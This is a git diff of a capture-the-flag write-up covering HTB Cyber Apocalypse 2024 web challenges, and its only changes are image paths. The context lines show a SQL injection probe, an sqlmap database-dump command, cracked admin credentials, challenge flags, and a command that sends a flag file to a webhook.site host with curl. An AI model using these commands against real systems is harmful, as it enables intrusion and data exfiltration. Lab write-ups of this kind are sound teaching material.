@@ -98,11 +98,11 @@ const fetchOptions = () => {
 
 Here is the list of available commands, including the secret:
 
-![Flag Command](images/HTBAPOCALYPSE2024_flagcommand1.png)
+![Flag Command](/assets/img/HTB-Cyber-Apocalypse-2024/images/HTBAPOCALYPSE2024_flagcommand1.png)
 
 Getting the flag with the secret command "Blip-blop, in a pickle with a hiccup! Shmiggity-shmack":
 
-![Flag Command](images/HTBAPOCALYPSE2024_flagcommand2.png)
+![Flag Command](/assets/img/HTB-Cyber-Apocalypse-2024/images/HTBAPOCALYPSE2024_flagcommand2.png)
 
 **Flag**: HTB{D3v3l0p3r_t00l5_4r3_b35t_wh4t_y0u_Th1nk??!}
 
@@ -113,30 +113,30 @@ Getting the flag with the secret command "Blip-blop, in a pickle with a hiccup! 
 **Solving Scenario:**\
 Trigger the login page error by sending 'a# as the username. The response should display an SQL error indicating vulnerability to SQL Injection.
 
-![KORP Terminal](images/HTBAPOCALYPSE2024_korpterminal1.png)
+![KORP Terminal](/assets/img/HTB-Cyber-Apocalypse-2024/images/HTBAPOCALYPSE2024_korpterminal1.png)
 
 Exploit using SQLmap with the input file containing the above POST request.
 Command: "sqlmap -r login.txt --dbs --ignore-code 401".
 
 Database:
 
-![KORP Terminal](images/HTBAPOCALYPSE2024_korpterminal2.png)
+![KORP Terminal](/assets/img/HTB-Cyber-Apocalypse-2024/images/HTBAPOCALYPSE2024_korpterminal2.png)
 
 Tables korp_terminal:
 
-![KORP Terminal](images/HTBAPOCALYPSE2024_korpterminal3.png)
+![KORP Terminal](/assets/img/HTB-Cyber-Apocalypse-2024/images/HTBAPOCALYPSE2024_korpterminal3.png)
 
 Dump table users:
 
-![KORP Terminal](images/HTBAPOCALYPSE2024_korpterminal4.png)
+![KORP Terminal](/assets/img/HTB-Cyber-Apocalypse-2024/images/HTBAPOCALYPSE2024_korpterminal4.png)
 
 Cracking admin hash:
 
-![KORP Terminal](images/HTBAPOCALYPSE2024_korpterminal5.png)
+![KORP Terminal](/assets/img/HTB-Cyber-Apocalypse-2024/images/HTBAPOCALYPSE2024_korpterminal5.png)
 
 Login with credentials admin:password123 and retrieve the flag:
 
-![KORP Terminal](images/HTBAPOCALYPSE2024_korpterminal6.png)
+![KORP Terminal](/assets/img/HTB-Cyber-Apocalypse-2024/images/HTBAPOCALYPSE2024_korpterminal6.png)
 
 **Flag**: HTB{t3rm1n4l_cr4ck1ng_sh3n4nig4n5}
 
@@ -182,11 +182,11 @@ class TimeController
 
 Validation of vulnerability:
 
-![TimeKORP](images/HTBAPOCALYPSE2024_timekorp1.png)
+![TimeKORP](/assets/img/HTB-Cyber-Apocalypse-2024/images/HTBAPOCALYPSE2024_timekorp1.png)
 
 Read the flag at /flag as per the Dockerfile:
 
-![TimeKORP](images/HTBAPOCALYPSE2024_timekorp2.png)
+![TimeKORP](/assets/img/HTB-Cyber-Apocalypse-2024/images/HTBAPOCALYPSE2024_timekorp2.png)
 
 **Flag**: HTB{t1m3_f0r_th3_ult1m4t3_pwn4g3}
 
@@ -309,7 +309,7 @@ cat /flag* > /tmp/flag.txt && curl -d @/tmp/flag.txt https://webhook.site/e361f2
 
 Run the exploit. If the request does not go through, try running it again:
 
-![Labyrinth Linguist](images/HTBAPOCALYPSE2024_labyrinth1.png)
+![Labyrinth Linguist](/assets/img/HTB-Cyber-Apocalypse-2024/images/HTBAPOCALYPSE2024_labyrinth1.png)
 
 **Flag**: HTB{f13ry_t3mpl4t35_fr0m_th3_d3pth5!!}
 
@@ -456,7 +456,7 @@ Save the solver file inside the challenge source code folder so that the pb libr
 Run with the command "go run call.go".
 Refresh the web page, and the flag will be obtained.
 
-![Testimonial](images/HTBAPOCALYPSE2024_testimonial1.png)
+![Testimonial](/assets/img/HTB-Cyber-Apocalypse-2024/images/HTBAPOCALYPSE2024_testimonial1.png)
 
 **Flag**: HTB{w34kly_t35t3d_t3mplate5}
 
@@ -634,7 +634,7 @@ if __name__ == "__main__":
     print(run.exploit())
 ```
 
-![SerialFlow](images/HTBAPOCALYPSE2024_serialflow1.png)
+![SerialFlow](/assets/img/HTB-Cyber-Apocalypse-2024/images/HTBAPOCALYPSE2024_serialflow1.png)
 
 **Flag**: HTB{y0u_th0ught_th15_wou1d_b3_s1mpl3?}
 
